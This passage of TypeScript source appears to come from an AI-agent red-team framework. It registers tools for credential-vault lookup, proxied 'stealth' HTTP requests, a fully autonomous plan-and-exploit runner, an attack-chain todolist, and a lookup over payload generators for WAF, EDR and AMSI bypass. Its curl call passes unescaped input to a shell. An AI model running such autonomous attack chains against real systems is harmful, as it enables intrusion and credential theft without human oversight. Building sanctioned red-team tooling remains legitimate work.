				if (redTeamStore) {
					try {
						const persisted = redTeamStore.lookupCredentials(v.target);
						if (persisted.length > 0) {
							return { credentials: persisted };
						}
					} catch {
						// fallback
					}
				}
				const creds = credVault.filter(
					(c) => c.target === v.target || c.target.includes(v.target),
				);
				return { credentials: creds };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ credentials: typeof credVault; count: number }
		>({
			name: "rt_cred_vault_list",
			description: "List all stored credentials in the vault.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				if (redTeamStore) {
					try {
						const persisted = redTeamStore.listCredentials();
						if (persisted.length > 0) {
							return {
								credentials: persisted,
								count: persisted.length,
							};
						}
					} catch {
						// fallback
					}
				}
				return {
					credentials: [...credVault],
					count: credVault.length,
				};
			},
		}) as AgentTool,
	);

	// --- Stealth proxy application ---
	tools.push(
		createTool<
			{ url: z.ZodString; proxy: z.ZodString },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_stealth_request",
			description:
				"Make an HTTP request through a proxy with stealth headers (UA rotation, jitter).",
			inputSchema: zodToJsonSchema(
				z.object({ url: z.string().min(1), proxy: z.string().min(1) }),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({ url: z.string().min(1), proxy: z.string().min(1) }),
					input,
				);
				const cmd = `curl -s -x ${v.proxy} -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html" -H "Accept-Language: en-US,en;q=0.9" --max-time 30 ${v.url}`;
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 50000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 50000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Auto-execution on goal (default behavior) ---
	tools.push(
		createTool<
			{
				goal: string;
				target: string;
				mode?: "recon" | "full" | "exploit" | "postex";
			},
			{
				planId: string;
				status: string;
				executed: number;
				results: unknown[];
				message: string;
			}
		>({
			name: "rt_auto_run",
			description:
				"Fully autonomous: create plan + execute all steps + generate report. No manual intervention needed.",
			inputSchema: zodToJsonSchema(
				z.object({
					goal: z.string().min(1),
					target: z.string().min(1),
					mode: z.enum(["recon", "full", "exploit", "postex"]).optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						goal: z.string().min(1),
						target: z.string().min(1),
						mode: z.enum(["recon", "full", "exploit", "postex"]).optional(),
					}),
					input,
				);
				const mode = v.mode ?? "full";
				// Create plan
				const createTool = tools.find(
					(t) => (t as { name?: string }).name === "rt_plan_create",
				) as unknown as { execute: (i: unknown) => Promise<unknown> };
				const planResult = (await createTool.execute({
					goal: v.goal,
					target: v.target,
					mode,
				})) as { plan: { id: string } };
				const planId = planResult.plan.id;
				// Drive execution
				const driveTool = tools.find(
					(t) => (t as { name?: string }).name === "rt_plan_drive",
				) as unknown as { execute: (i: unknown) => Promise<unknown> };
				const driveResult = (await driveTool.execute({
					planId,
					autoExecute: true,
				})) as {
					status: string;
					executed: number;
					results: unknown[];
					message: string;
				};
				return {
					planId,
					status: driveResult.status,
					executed: driveResult.executed,
					results: driveResult.results,
					message: driveResult.message,
				};
			},
		}) as AgentTool,
	);

	// --- Auto-log (persist everything to memory + obsidian) ---

	tools.push(
		createTool<
			{
				target: string;
				action: string;
				result: string;
				success: boolean;
				durationMs?: number;
			},
			{ logged: boolean }
		>({
			name: "rt_auto_log",
			description:
				"Auto-log an action to Obsidian + memory + cognitive. Use after EVERY tool execution.",
			inputSchema: zodToJsonSchema(
				z.object({
					target: z.string().min(1),
					action: z.string().min(1),
					result: z.string().min(1),
					success: z.boolean(),
					durationMs: z.number().int().optional(),
				}),
			),
			execute: async (input) => {
				const v = validateWithZod(
					z.object({
						target: z.string().min(1),
						action: z.string().min(1),
						result: z.string().min(1),
						success: z.boolean(),
						durationMs: z.number().int().optional(),
					}),
					input,
				);
				// Log to cognitive
				if (cognitiveService) {
					try {
						cognitiveService.recordCommand(
							v.action,
							v.durationMs ?? 0,
							v.success,
						);
						cognitiveService.reflect(
							v.target,
							`${v.action}: ${v.result.slice(0, 200)}`,
							v.success,
						);
					} catch {
						/* ignore */
					}
				}
				// Log to memory
				if (memoryService) {
					try {
						memoryService.store({
							kind: "episode",
							key: `ap2.op.${Date.now()}`,
							value: `${v.target}|${v.action}|${v.result.slice(0, 200)}`,
							confidence: 0.9,
							tags: ["redteam", v.target, v.action],
						});
					} catch {
						/* ignore */
					}
				}
				// Log to obsidian
				if (obsidianService) {
					try {
						obsidianService.autoRemember(
							`${v.action}: ${v.result.slice(0, 200)}`,
							v.target,
						);
					} catch {
						/* ignore */
					}
				}
				// Log to graph
				if (graphService) {
					try {
						graphService.logTrace({
							command: v.action,
							output: v.result.slice(0, 500),
							observation: v.success ? "success" : "failure",
						});
					} catch {
						/* ignore */
					}
				}
				return { logged: true };
			},
		}) as AgentTool,
	);

	// Planner shared todolist (dependency-ordered attack chain)
	if (todoStore) {
		try {
			todoStore.init();
		} catch {
			/* ignore */
		}
		const factExists = (fact: string): boolean => {
			if (!graphService) return true;
			try {
				const nodes =
					(
						graphService as {
							listNodes?: (t: string) => Array<{ id?: string; title?: string }>;
						}
					).listNodes?.("fact") ?? [];
				return nodes.some((n) => n.id === fact || n.title === fact);
			} catch {
				return true;
			}
		};

		const TodoAddSchema = z.object({
			target: z.string().min(1),
			title: z.string().min(1),
			prereqId: z.string().optional(),
			requiredFact: z.string().optional(),
			orderIndex: z.number().int().optional(),
		});
		tools.push(
			createTool({
				name: "rt_todo_add",
				description:
					"Add a step to the shared planner todolist for a target. Steps form a serial attack chain; use prereqId to express dependency ordering and requiredFact to gate on a yielded fact.",
				inputSchema: zodToJsonSchema(TodoAddSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoAddSchema, raw);
					const id = todoStore.add({
						target: args.target,
						title: args.title,
						prereqId: args.prereqId ?? null,
						requiredFact: args.requiredFact ?? null,
						orderIndex: args.orderIndex ?? 0,
					});
					return { id, target: args.target, title: args.title };
				},
			}) as AgentTool,
		);

		const TodoListSchema = z.object({ target: z.string().min(1) });
		tools.push(
			createTool({
				name: "rt_todo_list",
				description:
					"List the shared planner todolist for a target, ordered by dependency/order.",
				inputSchema: zodToJsonSchema(TodoListSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoListSchema, raw);
					return { target: args.target, items: todoStore.list(args.target) };
				},
			}) as AgentTool,
		);

		tools.push(
			createTool({
				name: "rt_todo_next",
				description:
					"Return the next ready todolist step: first pending item whose prerequisite is done and whose required fact exists. Assign an intent to it, then mark in_progress.",
				inputSchema: zodToJsonSchema(TodoListSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoListSchema, raw);
					const item = todoStore.nextReady(args.target, factExists);
					return item ? { item } : { item: null, message: "no ready step" };
				},
			}) as AgentTool,
		);

		const TodoDoneSchema = z.object({
			id: z.string().min(1),
			result: z.string().optional(),
		});
		tools.push(
			createTool({
				name: "rt_todo_done",
				description:
					"Mark a todolist step as done (its prerequisite fact is now satisfied).",
				inputSchema: zodToJsonSchema(TodoDoneSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoDoneSchema, raw);
					todoStore.markDone(args.id, args.result);
					return { id: args.id, status: "done" };
				},
			}) as AgentTool,
		);

		const TodoBlockSchema = z.object({
			id: z.string().min(1),
			reason: z.string().min(1),
		});
		tools.push(
			createTool({
				name: "rt_todo_block",
				description: "Mark a todolist step as blocked with a reason.",
				inputSchema: zodToJsonSchema(TodoBlockSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoBlockSchema, raw);
					todoStore.markBlocked(args.id, args.reason);
					return { id: args.id, status: "blocked" };
				},
			}) as AgentTool,
		);

		const TodoProgressSchema = z.object({
			id: z.string().min(1),
			intentId: z.string().optional(),
		});
		tools.push(
			createTool({
				name: "rt_todo_start",
				description:
					"Mark a todolist step as in_progress and optionally link the assigned intent id.",
				inputSchema: zodToJsonSchema(TodoProgressSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoProgressSchema, raw);
					todoStore.markInProgress(args.id, args.intentId);
					return { id: args.id, status: "in_progress" };
				},
			}) as AgentTool,
		);

		const TodoClearSchema = z.object({ target: z.string().min(1) });
		tools.push(
			createTool({
				name: "rt_todo_clear",
				description: "Clear all todolist steps for a target.",
				inputSchema: zodToJsonSchema(TodoClearSchema),
				execute: async (raw) => {
					const args = validateWithZod(TodoClearSchema, raw);
					const n = todoStore.clear(args.target);
					return { target: args.target, cleared: n };
				},
			}) as AgentTool,
		);
	}

	// --- Unified Reference & Reverse Engineering Multiplexers (Token Optimization) ---
	const refToolsByName = new Map<string, AgentTool>();
	const reToolsByName = new Map<string, AgentTool>();
	for (const tool of tools) {
		if (tool.name.startsWith("rt_ref_")) {
			refToolsByName.set(tool.name, tool);
			refToolsByName.set(tool.name.slice("rt_ref_".length), tool);
		} else if (tool.name.startsWith("rt_re_")) {
			reToolsByName.set(tool.name, tool);
			reToolsByName.set(tool.name.slice("rt_re_".length), tool);
		}
	}

	const ReferenceLookupSchema = z.object({
		topic: z
			.string()
			.min(1)
			.describe(
				"Reference topic (e.g. 'list', 'payload_gen', 'waf_bypass', 'privesc_auto', 'ssti', 'deser', 'ssrf_bypass', 'upload_bypass', 'edr_bypass', 'amsi_bypass', 'ad_attack', 'cloud_attack', 'kill_chain', 'squad_deploy', etc.). Pass 'list' to see all available topics.",
			),
		params: z
			.record(z.string(), z.unknown())
			.optional()
			.describe("Optional parameters forwarded to the reference generator."),
	});
	tools.push(
		createTool<
			{ topic: string; params?: Record<string, unknown> },
			unknown
		>({
			name: "rt_reference",
			description:
				"Unified Red Team reference, payload generator, and cheatsheet lookup (consolidates all 64 rt_ref_* generators: payload_gen, waf_bypass, privesc_auto, ssti, deser, ssrf_bypass, upload_bypass, edr_bypass, amsi_bypass, ad_attack, cloud_attack, kill_chain, squad_deploy, etc.). Pass topic='list' to list all topics.",
			inputSchema: zodToJsonSchema(ReferenceLookupSchema),
			execute: async (input, execCtx) => {
				const v = validateWithZod(ReferenceLookupSchema, input);
				const key = v.topic.trim().toLowerCase();
				if (key === "list" || key === "all") {
					const available = [...refToolsByName.entries()]
						.filter(([k]) => !k.startsWith("rt_ref_"))
						.map(([k, t]) => ({ topic: k, toolName: t.name, description: t.description }));
					return { topics: available, count: available.length };
				}
				const matched = refToolsByName.get(key);
				if (!matched) {
					const suggestions = [...refToolsByName.keys()]
						.filter((k) => !k.startsWith("rt_ref_") && k.includes(key))
						.slice(0, 10);
					return {
						error: `Unknown reference topic '${v.topic}'.`,
						suggestions,
					};
				}
				return matched.execute((v.params ?? {}) as never, execCtx);
			},
		}) as AgentTool,
	);

	const ReverseEngineerSchema = z.object({
		action: z.enum([
			"file",
			"strings",
			"readelf",
			"objdump",
			"symbols",
			"r2",
			"ghidra",
			"gdb",
			"packer",
			"imports",
			"sections",
			"protocol",
			"dotnet",
			"android",
		]),
		path: z.string().optional(),
		pcap: z.string().optional(),
		flags: z.string().optional(),
		commands: z.string().optional(),
		minLen: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<z.infer<typeof ReverseEngineerSchema>, unknown>({
			name: "rt_reverse_engineer",
			description:
				"Unified reverse engineering tool running in Kali container (actions: file, strings, readelf, objdump, symbols, r2, ghidra, gdb, packer, imports, sections, protocol, dotnet, android).",
			inputSchema: zodToJsonSchema(ReverseEngineerSchema),
			execute: async (input, execCtx) => {
				const v = validateWithZod(ReverseEngineerSchema, input);
				const matched = reToolsByName.get(v.action);
				if (!matched) {
					return { error: `Unknown reverse engineering action '${v.action}'` };
				}
				return matched.execute(v as never, execCtx);
			},
		}) as AgentTool,
	);

}
